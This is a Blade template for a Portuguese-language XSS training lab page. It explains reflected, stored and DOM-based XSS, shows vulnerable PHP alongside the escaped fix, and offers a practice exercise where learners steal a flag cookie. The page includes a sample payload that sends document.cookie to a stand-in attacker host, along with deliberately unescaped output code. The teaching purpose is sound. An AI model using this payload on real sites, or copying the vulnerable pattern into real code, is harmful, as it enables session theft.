<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Vulnerability - OwnedBox</title>

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Google Fonts - Space Grotesk -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">

    <!-- Custom CSS -->
    @vite('resources/css/modulo.css')
    <meta name="csrf-token" content="{{ csrf_token() }}">
</head>
<body>
    <!-- Header -->
    @include('components.nav')

    <!-- Main Content -->
    <main class="main-content">
        <div class="container-fluid">
            <div class="row justify-content-center">
                <div class="col-12 col-xl-10 col-xxl-8">
                    <!-- Content Card -->
                    <div class="content-card">
                        <!-- Hero Section -->
                        <div class="hero-section">
                            <h2 class="page-title">Vulnerabilidade de Cross-Site Scripting (XSS)</h2>
                            <p class="page-level">Nível: Iniciante</p>
                        </div>

                        <!-- Description Section -->
                        <div class="section-header">
                            <h3 class="section-title">Descrição</h3>
                        </div>
                        <div class="section-content">
                            <p class="section-text">Cross-Site Scripting (XSS) é uma vulnerabilidade que permite a um atacante injetar scripts maliciosos em páginas confiáveis renderizadas para outros usuários. Esses scripts são executados no navegador da vítima e podem ser usados para roubar cookies, sequestrar sessões ou desfigurar a página.</p>
                        </div>

                        @verbatim
                        <!-- Why it's dangerous -->
                        <div class="section-header">
                            <h3 class="section-title">Por que é perigosa?</h3>
                        </div>
                        <div class="section-content">
                            <div class="danger-box">
                                <p class="box-title">⚠️ O atacante executa código no navegador da vítima</p>
                                <p class="section-text">Quando um script malicioso roda na sessão da vítima, ele tem o mesmo poder que o próprio site. Na prática, o atacante pode:</p>
                                <ul class="guide-list">
                                    <li><strong>Roubar cookies de sessão</strong> e entrar na conta da vítima sem precisar da senha.</li>
                                    <li><strong>Capturar o que a vítima digita</strong> (senhas, cartões) com um keylogger em JavaScript.</li>
                                    <li><strong>Fazer ações em nome da vítima</strong>, como trocar e-mail/senha ou transferir valores.</li>
                                    <li><strong>Redirecionar para sites falsos</strong> (phishing) ou desfigurar a página.</li>
                                </ul>
                            </div>
                        </div>

                        <!-- Types -->
                        <div class="section-header">
                            <h3 class="section-title">Tipos de XSS</h3>
                        </div>
                        <div class="section-content">
                            <ul class="guide-list">
                                <li><strong>Refletido:</strong> o script vem em um link/parâmetro e é "devolvido" na resposta na hora (ex.: campo de busca).</li>
                                <li><strong>Armazenado:</strong> o script é salvo no servidor (comentário, perfil) e atinge todos que abrem a página. É o mais perigoso.</li>
                                <li><strong>DOM-based:</strong> o próprio JavaScript do site insere dados não tratados no HTML da página.</li>
                            </ul>
                        </div>

                        <!-- Vulnerable code -->
                        <div class="section-header">
                            <h3 class="section-title">Exemplo de código vulnerável</h3>
                        </div>
                        <div class="section-content">
                            <p class="section-text">O código abaixo pega um valor enviado pelo usuário e o coloca direto no HTML, <strong>sem nenhum tratamento</strong>:</p>
                            <div class="code-block vulnerable">
                                <div class="code-header">✗ Vulnerável — PHP</div>
                                <pre><code><span class="line"><span class="cmt">// Recebe o nome diretamente da URL (ex.: ?nome=Maria)</span></span>
<span class="line">$nome = $_GET['nome'];</span>
<span class="line"></span>
<span class="line"><span class="cmt">// Joga o valor direto no HTML, sem escapar nada</span></span>
<span class="line bad">echo "&lt;h1&gt;Olá, $nome!&lt;/h1&gt;";</span></code></pre>
                            </div>
                        </div>

                        <!-- How the attack works -->
                        <div class="section-header">
                            <h3 class="section-title">Como o ataque funciona</h3>
                        </div>
                        <div class="section-content">
                            <p class="section-text">Em vez de um nome, o atacante envia um script no parâmetro da URL. Como o site não trata a entrada, o navegador da vítima executa o código:</p>
                            <div class="code-block vulnerable">
                                <div class="code-header">✗ Payload do atacante (na URL)</div>
                                <pre><code><span class="line bad">?nome=&lt;script&gt;new Image().src='https://atacante.com/roubo?c='+document.cookie&lt;/script&gt;</span></code></pre>
                            </div>
                            <p class="section-text" style="margin-top: 10px;">Resultado: o cookie de sessão da vítima é enviado para o servidor do atacante, que pode então sequestrar a conta.</p>
                        </div>

                        <!-- Solution -->
                        <div class="section-header">
                            <h3 class="section-title">Como se proteger (Solução)</h3>
                        </div>
                        <div class="section-content">
                            <p class="section-text">A regra de ouro é: <strong>nunca confie na entrada do usuário</strong> e sempre escape a saída antes de exibi-la no HTML.</p>
                            <div class="code-block secure">
                                <div class="code-header">✓ Seguro — PHP</div>
                                <pre><code><span class="line">$nome = $_GET['nome'];</span>
<span class="line"></span>
<span class="line"><span class="cmt">// htmlspecialchars converte &lt; &gt; " ' em entidades seguras</span></span>
<span class="line good">$seguro = htmlspecialchars($nome, ENT_QUOTES, 'UTF-8');</span>
<span class="line"></span>
<span class="line">echo "&lt;h1&gt;Olá, $seguro!&lt;/h1&gt;";</span></code></pre>
                            </div>
                            <div class="info-box" style="margin-top: 12px;">
                                <p class="box-title">✓ Boas práticas</p>
                                <ul class="guide-list">
                                    <li><strong>Escape a saída sempre:</strong> use <code class="inline-code">htmlspecialchars()</code> em PHP. No Laravel, <code class="inline-code">{{ $nome }}</code> já escapa automaticamente — evite o <code class="inline-code">{!! !!}</code>.</li>
                                    <li><strong>Cookies com HttpOnly:</strong> impede que o JavaScript leia o cookie de sessão (<code class="inline-code">document.cookie</code>).</li>
                                    <li><strong>Content-Security-Policy (CSP):</strong> bloqueia a execução de scripts não autorizados.</li>
                                    <li><strong>Valide e sanitize</strong> as entradas no servidor, nunca apenas no navegador.</li>
                                </ul>
                            </div>
                        </div>
                        @endverbatim

                        <!-- Practice Section -->
                        <div class="section-header">
                            <h3 class="section-title">Prática</h3>
                        </div>
                        <div class="section-content">
                            <p class="section-text">Gere uma instância de vítima. A página exibida possui um campo refletido sem sanitização e armazena uma flag em um cookie acessível via JavaScript. Use um payload XSS para ler o cookie e obter o token.</p>
                        </div>
                        <div class="button-container">
                            <button id="btn-generate-victim" class="btn-generate">Gerar Vítima</button>
                        </div>
                        <div id="flag-id-container" style="margin-top: 10px;"></div>

                        <!-- Submit Token Section -->
                        <div class="section-header">
                            <h3 class="section-title">Enviar Token</h3>
                        </div>
                        <div class="form-section">
                            <div class="form-group">
                                <label for="token" class="form-label-custom">Token</label>
                                <input type="text" class="form-control form-input-custom" id="token" placeholder="Digite o token aqui">
                            </div>
                        </div>
                        <div class="button-container">
                            <button id="btn-submit-token" class="btn-submit">Enviar</button>
                            <div id="token-result-container" style="margin-top: 10px;"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
<script>
    document.getElementById('btn-generate-victim').addEventListener('click', function() {
        const btn = this;
        const resultBox = document.getElementById('flag-id-container');

        btn.disabled = true;
        btn.textContent = 'Gerando...';
        resultBox.innerHTML = '<span>Iniciando vítima...</span>';

        fetch('/lab/xss/generate-victim', {
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({})
        })
        .then(async response => {
            const data = await response.json().catch(() => ({}));

            if (!response.ok) {
                throw data;
            }

            return data;
        })
        .then(data => {
            if (data.success) {
                resultBox.innerHTML = `
                    <div style="margin-top: 12px; padding: 12px; border: 1px solid #38bdf8; border-radius: 10px;">
                        <p style="margin-bottom: 6px;"><b>Vítima gerada com sucesso.</b></p>
                        <p style="margin-bottom: 6px;">
                            <b>Link:</b>
                            <a href="${data.victim_url}" target="_blank" rel="noopener noreferrer">
                                ${data.victim_url}
                            </a>
                        </p>
                        <p style="margin-bottom: 0;"><b>Porta:</b> ${data.port}</p>
                    </div>
                `;
            } else {
                resultBox.innerHTML = '<span style="color:red">' + (data.message || 'Erro ao iniciar laboratório') + '</span>';
            }
        })
        .catch(error => {
            console.error(error);

            let message = error && error.message ? error.message : 'Erro ao iniciar laboratório';

            if (error && error.output_up) {
                message += '<br><pre style="white-space: pre-wrap;">' + error.output_up.join("\n") + '</pre>';
            }

            resultBox.innerHTML = '<span style="color:red">' + message + '</span>';
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'Gerar Vítima';
        });
    });

    document.getElementById('btn-submit-token').addEventListener('click', function() {
        const btn = this;
        const tokenInput = document.getElementById('token');
        const resultBox = document.getElementById('token-result-container');

        btn.disabled = true;
        btn.textContent = 'Validando...';

        fetch('/lab/xss/validate-token', {
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                token: tokenInput.value
            })
        })
        .then(async response => {
            const data = await response.json().catch(() => ({}));

            if (!response.ok) {
                throw data;
            }

            return data;
        })
        .then(data => {
            resultBox.innerHTML = '<span style="color: #10b981; font-weight: bold;">' + data.message + '</span>';
        })
        .catch(error => {
            const message = error && error.message ? error.message : 'Erro ao validar token';
            resultBox.innerHTML = '<span style="color: red; font-weight: bold;">' + message + '</span>';
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'Enviar';
        });
    });
</script>
</html>
